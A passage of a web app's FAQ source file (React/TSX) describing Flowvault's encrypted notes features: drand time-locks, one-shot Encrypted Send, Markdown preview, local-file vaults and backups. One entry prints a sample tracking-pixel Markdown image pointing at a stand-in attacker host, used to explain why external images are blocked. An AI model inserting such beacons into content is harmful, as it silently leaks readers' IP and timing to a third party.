        After a release you should treat the URL as burned and start a new
        vault.
      </>
    ),
  },
  {
    q: "What happens to my other hidden notebooks when the handover fires?",
    a: (
      <>
        Only the notebook that belongs to the master key you wrapped is
        exposed to the beneficiary &mdash; by design. The other slots in
        the vault (decoys, or notebooks under other passwords) stay as
        random-looking bytes that the beneficiary has no key for. If you
        care about this, configure the handover from a <em>decoy</em>{" "}
        notebook&apos;s session rather than from your primary one.
      </>
    ),
  },
  {
    q: "Do Standard Notes / ProtectedText / Privnote have a trusted handover?",
    a: (
      <>
        Not out of the box. Standard Notes has paid cloud sharing but not a
        time-triggered release mechanism. ProtectedText, Privnote,
        CryptPad, and most &ldquo;zero-knowledge notepad&rdquo; services
        have no concept of inheritance &mdash; forget or lose the password
        and the data is gone. Bitwarden&apos;s <em>Emergency Access</em>{" "}
        feature is the closest mainstream analog, but it requires accounts
        on both sides and is gated behind a paid plan. Flowvault ships the
        trusted handover as a first-class, client-side, account-less
        feature.
      </>
    ),
  },
  {
    q: "Time-locked notes — are those the same as the trusted handover?",
    a: (
      <>
        No, they&apos;re complementary. The trusted handover uses a
        password-wrapped key that a <em>server</em> unveils after a
        timeout. Time-locked notes use the <Strong>drand</Strong> public
        randomness beacon&apos;s threshold BLS signatures as the unlock
        material &mdash; nobody, not us, not you, can decrypt before
        drand publishes the round signature. Different threat models,
        different mechanisms.
      </>
    ),
  },
  {
    q: "How do time-locked notes work?",
    a: (
      <>
        <p>
          You compose a message and pick an unlock moment. Your browser:
        </p>
        <ol className="mt-2 list-decimal space-y-1 pl-5">
          <li>
            computes the drand round number whose signature will be
            published closest to your unlock moment (30-second
            granularity);
          </li>
          <li>
            encrypts your plaintext to that round using{" "}
            <Strong>tlock</Strong> &mdash; identity-based encryption over
            BLS12-381, with the round number as the identity;
          </li>
          <li>
            uploads only the opaque ciphertext, the target round, and
            the drand chain hash to a write-once{" "}
            <Strong>timelocks</Strong> Firestore collection.
          </li>
        </ol>
        <p className="mt-3">
          We hand you back a share link like{" "}
          <Strong>useflowvault.com/t/xyz</Strong>. Visit it any
          time: before the unlock moment you see a countdown, after it
          your browser grabs the drand round signature and decrypts
          locally. Flowvault cannot unlock it early &mdash; the key
          literally doesn&apos;t exist yet.
        </p>
      </>
    ),
  },
  {
    q: "Who / what is drand?",
    a: (
      <>
        <Strong>drand</Strong> is a distributed randomness beacon
        operated by a network of independent organisations (Cloudflare,
        Protocol Labs, the EPFL DEDIS lab, Kudelski Security, and
        others). Every 30 seconds the network publishes a fresh BLS
        threshold signature. Nobody can produce that signature in
        advance because nobody holds the full private key &mdash; a
        supermajority of node operators have to collaborate for each
        round. That&apos;s what makes it safe to use drand rounds as
        identities for time-lock encryption: the &ldquo;unlock key&rdquo;
        for a round doesn&apos;t exist until enough honest operators
        sign.
      </>
    ),
  },
  {
    q: "Can Flowvault or law enforcement decrypt a time-locked note early?",
    a: (
      <>
        No. This is the central point of using drand + tlock rather than
        a server-held key. Until the target round&apos;s signature is
        published, the decryption key does not exist in any one place
        &mdash; not on our servers, not in your browser, not in a
        hardware module somewhere. A subpoena against Flowvault would
        yield only ciphertext and a target round number. A subpoena
        against drand would fail too: it would have to compel a
        supermajority of independent operators across jurisdictions to
        collude.
      </>
    ),
  },
  {
    q: "What are the limits and leaks of time-locked notes?",
    a: (
      <>
        The <em>target round</em>, and therefore the approximate unlock
        wall-clock time, is visible to the server &mdash; readers need
        it to know when to retry. The share URL is the access
        credential: anyone with the link can open the note once the
        round releases, so treat it like the secret (or see the next
        FAQ for an optional password gate). Message size is capped at
        128 KiB of plaintext. We rely on drand mainnet staying honest
        and on BLS12-381; if drand ever deprecates the scheme
        we&apos;ll migrate.
      </>
    ),
  },
  {
    q: "Can I require a password in addition to the time-lock?",
    a: (
      <>
        Yes. When composing a time-locked note, tick{" "}
        <em>&ldquo;Also require a password to read&rdquo;</em>. The note
        is then wrapped in <Strong>two layers</Strong>: an inner
        AES-256-GCM layer keyed by Argon2id(password), and an outer
        tlock layer keyed to the unlock round. The reader has to wait
        for the round to release <em>and</em> enter the password.
        Neither gate is redundant: before the round the capsule is
        completely opaque (even to someone who knows the password);
        after the round, the bytes become a password-shaped blob that
        still needs the key. We store no password and no hint, so if
        the reader forgets it, the message is gone even after the
        time-lock opens. Share the link and the password through
        different channels &mdash; e.g. link over email, password by
        phone call or Signal.
      </>
    ),
  },
  {
    q: "How is a time-locked note different from Privnote or other burn-after-reading links?",
    a: (
      <>
        Privnote-style services encrypt a note, put the key in a URL
        fragment, and delete the ciphertext the first time someone
        opens it. Anyone who gets the link <em>right now</em> can read
        it. Flowvault time-locked notes are the opposite: the link can
        be public, but <em>nobody</em> &mdash; not even the sender
        &mdash; can read the contents before the unlock moment. Great
        for a future-self letter, a scheduled disclosure, a
        capsule for an anniversary, or a trust-minimised release
        commitment. If what you want is the Privnote/Bitwarden-Send
        flavour instead (share a secret that self-destructs after the
        recipient reads it), use{" "}
        <Link href="/send/new" className="text-accent hover:underline">
          Encrypted Send
        </Link>
        .
      </>
    ),
  },
  {
    q: "What is Encrypted Send?",
    a: (
      <>
        Encrypted Send is Flowvault&rsquo;s one-shot sharing
        primitive &mdash; the tool you reach for when you need to hand
        someone a password, an API key, a recovery phrase, a piece of
        medical info, or any snippet you&rsquo;d rather not leave
        sitting in Slack / email / a password-reset thread. Paste the
        note at{" "}
        <Link href="/send/new" className="text-accent hover:underline">
          /send/new
        </Link>
        , pick how long it should live (up to 30 days) and how many
        times it can be opened (default: once), and share the link.
        After the final view, the ciphertext is{" "}
        <Strong>hard-deleted from our database</Strong> &mdash; the
        scheduled sweep also purges anything past its TTL.
      </>
    ),
  },
  {
    q: "How does Encrypted Send protect the note?",
    a: (
      <>
        <p>Four layers:</p>
        <ol className="mt-2 list-decimal space-y-1 pl-5">
          <li>
            Your browser generates a random 256-bit AES key and encrypts
            the plaintext with AES-256-GCM (authenticated encryption,
            so tampering is detectable).
          </li>
          <li>
            The key is placed in the URL fragment (after{" "}
            <Code>#</Code>). Browsers never send URL fragments to
            servers, so our database sees only the opaque ciphertext
            &mdash; we have no way to decrypt it.
          </li>
          <li>
            Optionally, you can add a password. The plaintext is then
            wrapped in an <Strong>inner</Strong> AES-GCM layer keyed by
            Argon2id(password) before the outer AES wrap. Same
            &ldquo;FVPW&rdquo; frame we use for time-locks.
          </li>
          <li>
            The server enforces the view counter atomically through a
            Cloud Function: reads go through <Code>readSend</Code>,
            which decrements the counter in a transaction and deletes
            the document the moment the last view is consumed.
            Firestore rules deny direct reads by clients &mdash; that&rsquo;s
            what makes the counter trustworthy.
          </li>
        </ol>
      </>
    ),
  },
  {
    q: "How is Encrypted Send different from Bitwarden Send, Privnote, or 1Password&rsquo;s share link?",
    a: (
      <>
        Same general idea &mdash; a one-shot encrypted link &mdash; but
        different trust anchors and packaging:
        <ul className="mt-2 list-disc space-y-1 pl-5">
          <li>
            <Strong>Bitwarden Send</Strong> is excellent and also
            zero-knowledge, but it&rsquo;s gated behind a Bitwarden
            account (for the sender) and closed server code for the
            receive path. Flowvault&rsquo;s equivalent is account-less
            and open source end-to-end &mdash; frontend, Cloud
            Functions, and Firestore rules all live in{" "}
            <Link href="/faq" className="text-accent hover:underline">
              the same repo
            </Link>
            .
          </li>
          <li>
            <Strong>Privnote</Strong> is account-less too, but
            closed-source; you take its claims on trust. It also lacks
            an optional password gate, so a leaked link is game over.
          </li>
          <li>
            <Strong>1Password Share</Strong> requires a 1Password
            account for the sender and shares through 1Password&rsquo;s
            infrastructure. Fine if you already live there.
          </li>
          <li>
            <Strong>Flowvault Encrypted Send</Strong>: no account,
            open source, optional password gate using the same
            Argon2id + AES-GCM construction as the rest of the
            product, hard-delete on last view, Firestore TTL as a
            belt-and-suspenders sweep, and it lives next to your vault
            and time-locks under one URL.
          </li>
        </ul>
      </>
    ),
  },
  {
    q: "Could Flowvault read my Encrypted Send note if you wanted to?",
    a: (
      <>
        No. The ciphertext goes to Firestore, but the 256-bit AES key
        lives in the URL fragment, which browsers never transmit.
        Anyone with access to our database &mdash; us, a cloud
        provider, a subpoena &mdash; sees only opaque bytes. If the
        sender also enabled a password, even leaking the URL
        isn&rsquo;t enough to read the note. If you&rsquo;re going to
        trust-but-verify any of this, the crypto is in{" "}
        <Code>src/lib/send/crypto.ts</Code> and{" "}
        <Code>src/lib/crypto/passwordFrame.ts</Code>, the Cloud
        Function is in <Code>functions/src/index.ts</Code>, and the
        rules are in <Code>firestore.rules</Code>.
      </>
    ),
  },
  {
    q: "What if someone intercepts the link before the recipient opens it?",
    a: (
      <>
        Whoever opens it first wins, and subsequent opens see
        &ldquo;already opened&rdquo; &mdash; which is actually a
        tripwire: if your recipient clicks the link and sees that
        message, you know the channel was compromised and can rotate
        whatever secret you shared. If that tripwire isn&rsquo;t
        enough for your threat model, tick{" "}
        <em>&ldquo;Also require a password to open&rdquo;</em>. The
        recipient then needs both the link and the password, shared
        through different channels (e.g. link by email, password by
        phone / Signal).
      </>
    ),
  },
  {
    q: "Does Encrypted Send support files or just text?",
    a: (
      <>
        Text only for now. Plaintext is capped at 128 KiB &mdash;
        plenty for credentials, recovery phrases, configs, a long
        paragraph of context. File attachments are on the roadmap and
        would use Firebase Storage with a similar URL-fragment-keyed
        wrap; they&rsquo;ll ship when we can do it without bloating
        the threat model.
      </>
    ),
  },
  {
    q: "What happens when an Encrypted Send note expires?",
    a: (
      <>
        An hourly Cloud Function (<Code>sendsSweep</Code>) batch-deletes
        any send past its <Code>expiresAt</Code> timestamp, and a
        Firestore TTL policy on the same field provides a secondary
        sweep. Whichever runs first wins; both are idempotent. Once
        the document is gone, even if someone saved the URL they see
        &ldquo;not found&rdquo; &mdash; Flowvault has no backup of
        deleted sends.
      </>
    ),
  },
];

const MARKDOWN: QA[] = [
  {
    q: "Does Flowvault render Markdown?",
    a: (
      <>
        Yes. As of v1.3, every notebook renders as GitHub-flavored
        Markdown in a <Strong>Preview</Strong> or <Strong>Split</Strong>{" "}
        view. A small segmented toggle in the editor toolbar flips
        between Edit, Preview, and Split; the textarea is still the
        source of truth and your notes are still plain text under the
        hood. Preference persists per device in <Code>localStorage</Code>{" "}
        (not in the encrypted blob, so it doesn&apos;t eat into your
        512 KiB slot).
      </>
    ),
  },
  {
    q: "Which Markdown flavor / features are supported?",
    a: (
      <>
        <Strong>GitHub-flavored Markdown</Strong> via{" "}
        <Code>react-markdown</Code> + <Code>remark-gfm</Code>:
        <ul className="mt-2 list-disc space-y-1 pl-5">
          <li>
            Headings (<Code># … ######</Code>), paragraphs, line breaks
          </li>
          <li>
            Bold, italic, strikethrough (<Code>~~like this~~</Code>)
          </li>
          <li>
            Ordered and unordered lists, including{" "}
            <Strong>GFM task lists</Strong> (
            <Code>- [x] done</Code>)
          </li>
          <li>Tables, blockquotes, horizontal rules</li>
          <li>
            Inline code and <Strong>fenced code blocks</Strong> with
            per-language Prism syntax highlighting (<Code>ts</Code>,
            <Code>py</Code>, <Code>rs</Code>, <Code>go</Code>,{" "}
            <Code>bash</Code>, <Code>json</Code>, and the rest of the
            usual crew)
          </li>
          <li>
            Autolinks (<Code>&lt;https://…&gt;</Code>) and standard{" "}
            <Code>[label](url)</Code> links
          </li>
          <li>Images, with the safety gate described below</li>
        </ul>
        <p className="mt-3">
          The preview ships without Mermaid diagrams or KaTeX math
          on purpose &mdash; both would pull in large extra bundles
          for a niche use case. If you need either, let us know via
          GitHub.
        </p>
      </>
    ),
  },
  {
    q: "Is the Markdown preview zero-knowledge too?",
    a: (
      <>
        Yes. Rendering happens entirely in your browser, after the
        slot is decrypted locally. Flowvault&apos;s server sees only
        the same opaque ciphertext as before &mdash; it never sees
        your Markdown source or the rendered HTML. The renderer
        bundle (~90 KB) is lazy-loaded via <Code>next/dynamic</Code>,
        so even the <em>decision</em> to use Markdown isn&apos;t
        reported to anyone: users who stay in Edit mode never
        download it.
      </>
    ),
  },
  {
    q: "Why can't I embed <script>, <iframe>, or arbitrary HTML in my notes?",
    a: (
      <>
        By design: raw HTML is <Strong>blocked</Strong> in the
        preview. Anything that looks like an HTML tag renders as
        literal text, not as an element. There is no toggle to
        enable raw HTML, and there won&apos;t be.
        <p className="mt-3">
          Two reasons. First, Flowvault&apos;s whole value prop is
          &ldquo;the server cannot read your notes.&rdquo; That guarantee
          collapses the moment a rendered <Code>&lt;script&gt;</Code>{" "}
          tag can exfiltrate your plaintext back out of the browser.
          Second, vaults can be handed over (trusted handover) or
          imported from a <Code>.fvault</Code> someone sent you;
          rendering arbitrary HTML from a notebook you didn&apos;t
          author is self-XSS waiting to happen. Keeping Markdown
          strict keeps the feature safe for beneficiaries and anyone
          collaborating via shared URL too.
        </p>
      </>
    ),
  },
  {
    q: "Why do external images show a \"Load image\" button instead of just appearing?",
    a: (
      <>
        Because a Markdown image is an HTTP request, and an HTTP
        request is an opportunity to leak data. A hostile author (or
        someone who coerced a beneficiary&apos;s vault into their
        own hands, then returned it) could drop{" "}
        <Code>![](https://attacker.example/pixel?v=target)</Code>{" "}
        into your notes, and the moment you unlocked the vault with
        preview enabled, your IP / user-agent / exact-to-the-second
        timing would ping their server.
        <p className="mt-3">
          Flowvault blocks that quiet channel. External images
          render as a placeholder showing the exact URL they would
          load, with a <Strong>Load image</Strong> button that
          explicitly notes &ldquo;sends a request to the host.&rdquo;
          You get full informed consent before any pixel crosses
          the network, and when you do load it we still set{" "}
          <Code>referrerPolicy=&quot;no-referrer&quot;</Code>, so
          the host never learns which Flowvault URL or local vault
          was the source.
        </p>
        <p className="mt-3">
          Inline base64 <Code>data:</Code> images render
          immediately, because they&apos;re part of the vault
          bytes &mdash; no network request, no leak.
        </p>
      </>
    ),
  },
  {
    q: "What about external links — do they leak my vault URL as the referrer?",
    a: (
      <>
        No. Every external link the preview renders is hardened with{" "}
        <Code>target=&quot;_blank&quot;</Code>,{" "}
        <Code>rel=&quot;noopener noreferrer&quot;</Code>, and{" "}
        <Code>referrerPolicy=&quot;no-referrer&quot;</Code>. The
        destination site sees a normal click but cannot tell it
        came from Flowvault, let alone which slug or local file.
      </>
    ),
  },
  {
    q: "Does syntax highlighting hit the network?",
    a: (
      <>
        No. Code blocks are highlighted locally by{" "}
        <Code>prism-react-renderer</Code>, which ships as part of
        the lazy-loaded preview bundle. No remote theme fetch, no
        WebAssembly download, no &ldquo;pick a language on first
        render&rdquo; round-trip. Flowvault&apos;s no-third-party
        posture extends to the rendering layer.
      </>
    ),
  },
  {
    q: "Can I still edit my notes as plain text?",
    a: (
      <>
        Yes &mdash; the textarea is the editor. Markdown is just a{" "}
        <em>view</em> over the same bytes. Switching between Edit,
        Preview, and Split doesn&apos;t change what gets saved;
        it changes what you see. If you never touch the toggle,
        Flowvault works exactly like before, and your{" "}
        <Code>.fvault</Code> backups and plaintext{" "}
        <Code>.md</Code> / <Code>.zip</Code> exports are identical
        byte-for-byte.
      </>
    ),
  },
  {
    q: "Does Split view work on my phone?",
    a: (
      <>
        Below ~900 px viewport width, the Split toggle hides
        automatically and Split collapses to Preview (or Edit,
        whichever you last chose). Your <em>preference</em> stays
        &ldquo;split&rdquo; so resizing back up to a wide viewport
        restores the layout without you toggling again. The
        textarea and preview both scroll independently so the
        experience on narrow screens is at least usable.
      </>
    ),
  },
  {
    q: "Is there a WYSIWYG Markdown editor?",
    a: (
      <>
        No, intentionally. A live WYSIWYG layer would mean shipping
        a much bigger dependency (TipTap / ProseMirror / Lexical)
        and would blur what&apos;s actually getting encrypted. One
        of Flowvault&apos;s design properties is &ldquo;your notes
        are plain Markdown text, not a proprietary JSON tree&rdquo;
        &mdash; which keeps export portable and keeps the
        serialisation simple. Edit / Preview / Split is the
        compromise that gives you rendering without hiding the
        source.
      </>
    ),
  },
];

const BYOS: QA[] = [
  {
    q: "What is Bring Your Own Storage (BYOS) in Flowvault?",
    a: (
      <>
        A mode where the vault&apos;s ciphertext doesn&apos;t live on our
        servers at all. You pick a file on your own disk &mdash; say{" "}
        <Code>D:\notes\journal.flowvault</Code> &mdash; and every save
        writes the encrypted blob back to <em>that</em> file via your
        browser&apos;s File System Access API. Same hidden-volume
        format, same Argon2id + AES-256-GCM, same multi-notebook tabs
        as a hosted vault. Flowvault just becomes the editor; your
        disk is the database.
      </>
    ),
  },
  {
    q: "How is BYOS different from the hosted Flowvault vault at /s/<slug>?",
    a: (
      <>
        The cryptography is identical &mdash; same slots, same KDF,
        same AES-GCM frames, same <Code>.fvault</Code> backup format.
        The difference is <em>where the ciphertext lives</em>:
        <ul className="mt-2 list-disc space-y-1 pl-5">
          <li>
            <Strong>Hosted vault</Strong>:{" "}
            <Code>useflowvault.com/s/&lt;slug&gt;</Code>. The
            ciphertext is stored in our Firestore. Shareable URL.
            Works from any device. Trusted handover and all
            server-dependent features work.
          </li>
          <li>
            <Strong>Local vault</Strong>:{" "}
            <Code>useflowvault.com/local/&lt;uuid&gt;</Code>.
            The ciphertext is a <Code>.flowvault</Code> file on your
            disk. Only openable on a device that has the file. The
            URL on its own is useless without the file. Trusted
            handover is not available because it needs a server-held
            scheduler.
          </li>
        </ul>
      </>
    ),
  },
  {
    q: "What does your server see for a local vault?",
    a: (
      <>
        Essentially nothing that relates to the vault itself. The URL{" "}
        <Code>/local/&lt;uuid&gt;</Code> is just a client-side route;
        the UUID is generated in your browser, never posted back, and
        the Next.js server doesn&apos;t know which file (if any) it
        corresponds to. Your browser never uploads the ciphertext or
        the file name to us. The one caveat is the editor chrome: if
        you use server-dependent features while a local vault is
        open &mdash; time-locked notes composition, Encrypted Send
        &mdash; those specific flows still talk to our backend for
        their own documents (a time-locked capsule, a send record),
        same as they would from a hosted vault. They never see your
        local vault&apos;s plaintext or ciphertext.
      </>
    ),
  },
  {
    q: "Which browsers support local vaults?",
    a: (
      <>
        BYOS relies on the{" "}
        <a
          href="https://developer.mozilla.org/en-US/docs/Web/API/File_System_API"
          target="_blank"
          rel="noreferrer"
          className="text-accent hover:underline"
        >
          File System Access API
        </a>
        , currently available in Chromium-based browsers (Chrome, Edge,
        Brave, Opera, Vivaldi, Arc) on desktop. Firefox and Safari
        don&apos;t implement it yet, so the{" "}
        &ldquo;Create / Open local vault&rdquo; buttons are disabled
        there with a note. A hosted vault at <Code>/s/&lt;slug&gt;</Code>{" "}
        still works in every browser. Mobile support for the API is
        spotty; we treat desktop Chromium as the supported surface for
        now.
      </>
    ),
  },
  {
    q: "What's inside a .flowvault file on disk?",
    a: (
      <>
        A small JSON header (format version, a per-file UUID, the
        Argon2id salt, KDF parameters, volume layout, a monotonic{" "}
        <Code>vaultVersion</Code> counter used for optimistic
        concurrency, and timestamps) followed by the raw ciphertext
        &mdash; the same fixed-size hidden-volume blob that would live
        in Firestore for a hosted vault. No passwords, no derived
        keys, no plaintext, no per-slot metadata. Opening the file in
        a text editor will just show you the JSON preamble and then
        binary noise. If a copy of the file leaks, an attacker has to
        do exactly the same offline brute-force work they&apos;d face
        against a stolen Firestore document &mdash; nothing more,
        nothing less.
      </>
    ),
  },
  {
    q: "How do I move a local vault between devices?",
    a: (
      <>
        Copy the <Code>.flowvault</Code> file. That&apos;s the whole
        state &mdash; put it on a USB stick, sync it through your
        cloud of choice, email it to yourself encrypted, whatever
        fits your threat model. On the other device, open Flowvault,
        click <Strong>Open local vault</Strong>, point at the copied
        file, and enter your password. The file is self-contained:
        everything the editor needs (salt, KDF params, volume
        layout, slots, CAS version) travels with it.
      </>
    ),
  },
  {
    q: "What if I edit the same local vault from two devices?",
    a: (
      <>
        Each save is gated by an optimistic CAS counter that lives
        inside the file, so you won&apos;t silently clobber the other
        side: whoever writes first wins, and the second writer sees a
        conflict. That said, BYOS is not a sync engine. If both
        devices edit the same vault without coordinating, you have
        the usual merge problem of any file-backed tool. The safe
        patterns are <em>(a)</em> edit in one place at a time, or{" "}
        <em>(b)</em> keep separate vaults on separate devices and
        merge manually. A proper sync story (conflict-free, offline,
        auto-resolving) would need a different backend &mdash; see
        the S3 / WebDAV question below.
      </>
    ),
  },
  {
    q: "Does trusted handover work on local vaults?",
    a: (
      <>
        No &mdash; and this is intentional. The trusted handover
        relies on a Cloud Function running on a schedule to mark a
        vault <Code>released</Code> after an inactivity interval,
        which only makes sense for a document that lives in the
        hosted Firestore. A local file sitting on your disk has no
        server watching it. If you want the handover behavior, use a
        hosted vault at <Code>/s/&lt;slug&gt;</Code>. The editor hides
        the Handover button for local vaults so it doesn&apos;t
        suggest a guarantee we can&apos;t keep.
      </>
    ),
  },
  {
    q: "What about time-locked notes and Encrypted Send from a local vault?",
    a: (
      <>
        Those still work &mdash; they have nothing to do with where
        your <em>vault</em> lives. Composing a time-locked note or an
        Encrypted Send from the editor stores the one-shot capsule /
        send document in our backend the same way as always; only the
        notebook text lives in your local file.
      </>
    ),
  },
  {
    q: "How is this different from the .fvault backup file?",
    a: (
      <>
        A <Code>.fvault</Code> is a{" "}
        <Strong>point-in-time snapshot</Strong>, taken by clicking
        Export. A <Code>.flowvault</Code> is the{" "}
        <Strong>live vault</Strong> &mdash; every save in the editor
        writes through to that file, same as a hosted vault writes
        through to Firestore. You can still export a{" "}
        <Code>.fvault</Code> from a local vault for cold storage, or
        restore from a <Code>.fvault</Code> into a hosted vault at{" "}
        <Link href="/restore" className="text-accent hover:underline">
          /restore
        </Link>
        . The two formats are siblings: same ciphertext, different
        roles.
      </>
    ),
  },
  {
    q: "What happens if I lose my .flowvault file?",
    a: (
      <>
        Your notes are gone. There is no copy on our servers. Treat
        the file the way you treat a password manager&apos;s local
        database or a VeraCrypt volume: back it up. An easy rhythm is
        a periodic <Code>.fvault</Code> export into a separate folder
        or cloud drive &mdash; the export is still zero-knowledge,
        still needs your password, so it&apos;s fine to store in
        places you wouldn&apos;t trust with plaintext.
      </>
    ),
  },
  {
    q: "Are S3, WebDAV, and other storage backends coming?",
    a: (
      <>
        Yes, on the roadmap if there&apos;s demand. The internal
        storage layer was refactored into a <Code>VaultStorageAdapter</Code>{" "}
        interface specifically so new backends plug in cleanly; the
        local-file adapter was the first non-Firestore implementation.
        Likely next candidates, in rough order:
        <ul className="mt-3 list-disc space-y-1 pl-5">
          <li>
            <Strong>S3-compatible</Strong> (AWS S3, Cloudflare R2,
            Backblaze B2, Wasabi, MinIO). Good for people who want
            their ciphertext in an object store they already pay for,
            with versioning turned on.
          </li>
          <li>
            <Strong>WebDAV</Strong> (Nextcloud, ownCloud,
            Storj-compatible gateways). Same idea, different wire
            format; easy to self-host.
          </li>
          <li>
            <Strong>IPFS / Storj / Arweave</Strong> for fully
            decentralised storage, treated as a more experimental
            tier.
          </li>
        </ul>
        <p className="mt-3">
          All of these would follow the same rule as local files: the
          blob stays opaque, the adapter just moves bytes, and
          server-dependent features (trusted handover, hosted routing)
          stay on Flowvault. If a specific backend is a blocker for
          you, please{" "}
          <a
            href="https://github.com/Flowdesktech/flowvault/issues/new"
            target="_blank"
            rel="noreferrer"
            className="text-accent hover:underline"
          >
            open a GitHub issue
          </a>{" "}
          and say so &mdash; prioritisation is driven by who actually
          wants to use it.
        </p>
      </>
    ),
  },
];

const BACKUP: QA[] = [
  {
    q: "Can I back up my Flowvault notes?",
    a: (
      <>
        Yes. Open any vault and click{" "}
        <Strong>Export &rarr; Encrypted backup (.fvault)</Strong> in
        the toolbar. You get a single file containing the full
        ciphertext blob plus the Argon2id salt, KDF parameters, and
        volume layout &mdash; exactly what the server stores. The
        backup is still zero-knowledge: reading it requires your
        password, and every decoy slot remains indistinguishable from
        random bytes inside it. Restore later from{" "}
        <Link href="/restore" className="text-accent hover:underline">
          /restore
        </Link>{" "}
        on this instance or on a self-hosted Flowvault.
      </>
    ),
  },
  {
    q: "Is the .fvault backup file itself encrypted?",
    a: (
      <>
        Yes. The ciphertext inside the backup is the same AES-256-GCM
        ciphertext the server holds, still keyed by Argon2id over your
        password and the per-vault salt. If a backup file leaks, an
        attacker has to do the same offline brute-force work they&apos;d
        do against a stolen Firestore document &mdash; nothing more,
        nothing less. The thin JSON envelope around the bytes is
        plaintext, but it only carries metadata that the server already
        stores (salt, KDF params, volume layout, slug hint), so the
        file isn&apos;t any more revealing than a copy of the database
        row.
      </>
    ),
  },
  {
    q: "How do I restore a Flowvault backup?",
    a: (
      <>
        Go to{" "}
        <Link href="/restore" className="text-accent hover:underline">
          /restore
        </Link>
        , drop your <Code>.fvault</Code> file, pick a fresh URL, and
        click <Strong>Restore vault</Strong>. We write the ciphertext
        and its original KDF/volume metadata into Firestore under that
        new slug. You never type a password during restore &mdash;
        there&apos;s no decryption happening server-side. Once the site
        exists, open it as normal and enter the password(s) you used
        before. Every slot (every decoy password) comes back intact.
      </>
    ),
  },
  {
    q: "Why does restore block me from overwriting an existing vault?",
    a: (
      <>
        Safety. Restoring onto an existing slug could silently destroy
        a notebook under a password you don&apos;t know about. We
        intentionally refuse rather than ask you to re-authenticate,
        because proving knowledge of <em>one</em> password wouldn&apos;t
        prove knowledge of the others that might be hidden in the same
        blob. Pick a new slug, or start a fresh vault and migrate
        content manually.
      </>
    ),
  },
  {
    q: "Can I export my notes as plaintext Markdown for Obsidian, Standard Notes, or a git repo?",
    a: (
      <>
        Yes &mdash; the same <Strong>Export</Strong> menu in the
        editor has a <Strong>Plaintext Markdown (.zip)</Strong>{" "}
        option. Each tab in the currently-unlocked slot becomes one{" "}
        <Code>.md</Code> file in the zip, plus a{" "}
        <Code>README.md</Code> index. The export is limited to the
        slot you&apos;re looking at &mdash; other passwords&apos; decoy
        slots are <em>never</em> included, which keeps plausible
        deniability intact even if you&apos;re exporting under
        coercion. We also show an explicit confirmation before writing
        any plaintext to disk.
      </>
    ),
  },
  {
    q: "Does ProtectedText have an export / backup feature?",
    a: (
      <>
        Not out of the box. ProtectedText has no export button, no
        API, and no backup file &mdash; the closest you can get is
        unlocking the note in the browser and manually copying the
        text. Flowvault&apos;s <Code>.fvault</Code> backup preserves
        your notes <em>encrypted</em>, so you can store copies on a
        USB stick, in another cloud, or on a friend&apos;s machine
        without ever exposing plaintext. If you want to migrate{" "}
        <em>into</em> Flowvault from ProtectedText today, the
        practical path is: unlock your note there, copy the text, paste
        it into a new Flowvault notebook. A guided importer is on the
        roadmap.
      </>
    ),
  },
  {
    q: "Can I self-host Flowvault and move my backups there?",
    a: (
      <>
        Yes. The whole stack &mdash; Next.js frontend, Cloud Functions
        (the trusted-handover release sweep and the Encrypted Send read
        path), and Firestore security rules &mdash; is in one public
        repository. Bring your own Firebase project, deploy the rules
        and Functions, point the frontend at it, and drop a{" "}
        <Code>.fvault</Code> file onto <Code>/restore</Code>. Because
        the backup format includes the KDF parameters and volume
        layout that produced the ciphertext, vaults made on the
        hosted Flowvault will open on your self-hosted one with the
        same password.
      </>
    ),
  },
  {
    q: "What exactly is inside a .fvault file?",
    a: (
      <>
        A single JSON envelope with these fields:
        <ul className="mt-3 list-disc space-y-1 pl-5">
          <li>
            <Code>kind</Code> = <Code>&quot;flowvault-backup&quot;</Code>{" "}
            and <Code>version</Code> (currently 1).
          </li>
          <li>
            <Code>exportedAt</Code> and an optional{" "}
            <Code>slugHint</Code> so the restore UI can prefill a
            sensible URL.
          </li>
          <li>
            <Code>kdfSalt</Code> (base64url) &mdash; the per-vault
            Argon2id salt.
          </li>
          <li>
            <Code>kdfParams</Code> &mdash; algorithm (argon2id), memory
            cost, iteration count, parallelism, key length.
          </li>
          <li>
            <Code>volume</Code> &mdash; slot count, slot size, and
            frame version.
          </li>
          <li>
            <Code>ciphertext</Code> (base64url) &mdash; the
            fixed-size hidden-volume blob, byte-for-byte identical to
            what lives in Firestore.
          </li>
        </ul>
        <p className="mt-3">
          No passwords, no keys, no plaintext, no per-slot metadata.
          You can inspect any <Code>.fvault</Code> with a plain text
          editor to verify that for yourself.
        </p>
      </>
    ),
  },
  {
    q: "Do other encrypted notepads have a zero-knowledge backup format?",
    a: (
      <>
        Most have <em>some</em> export, but usually as plaintext:
        <ul className="mt-3 list-disc space-y-1 pl-5">
          <li>
            <Strong>Standard Notes</Strong> exports to a JSON/zip of
            plaintext items (optionally into an encrypted archive on
            Plus/Pro). An account is required.
          </li>
          <li>
            <Strong>CryptPad</Strong> has per-pad exports to{" "}
            <Code>.md</Code> / <Code>.html</Code> / raw &mdash; all
            plaintext.
          </li>
          <li>
            <Strong>Bitwarden</Strong> exports to plaintext JSON/CSV
            (or a password-protected JSON variant; the secret is
            chosen at export time, not derived from your vault
            password).
          </li>
          <li>
            <Strong>Notesnook</Strong> exports encrypted backups (.nnbackup)
            behind an account and subscription, parallel to Flowvault&apos;s
            <Code>.fvault</Code> in spirit.
          </li>
          <li>
            <Strong>ProtectedText</Strong> / <Strong>Privnote</Strong>{" "}
            / <Strong>PrivateBin</Strong>: no export feature at all.
          </li>
        </ul>
        <p className="mt-3">
          Flowvault&apos;s angle is that the backup is{" "}
          <em>the same ciphertext you already trust on our server</em>,
          with no account tying it to you. Handing the file to a
          stranger is no worse than handing them your URL.
        </p>
      </>
    ),
  },
  {
    q: "How often should I back up?",
    a: (
      <>
        Flowvault backups are only as fresh as the moment you
        downloaded them, so treat them like snapshots, not live
        mirrors. A reasonable rhythm:{" "}
        <Strong>one backup after any major edit you can&apos;t afford
        to lose</Strong>, plus a monthly rolling snapshot if you use
        the vault for long-form notes. The file is ~680 KiB regardless
        of how much you&apos;ve written (fixed-size ciphertext), so
        storing many snapshots is cheap. Some users pair this with a
        trusted handover: the backup protects against data loss,
        the handover against you being unable to unlock it.
      </>
    ),
  },
];

const COMPANY: QA[] = [
  {
    q: "Who builds Flowvault?",
    a: "Flowvault is part of the Flowdesk family of tools. It's built in the open; contributions and security reviews are welcome.",
  },
  {
    q: "Is Flowvault open source? How does that compare to ProtectedText?",
    a: (
      <>
        Yes &mdash; and importantly, the whole stack, not just the frontend
        bundle. Three things are published together in the same
        repository:
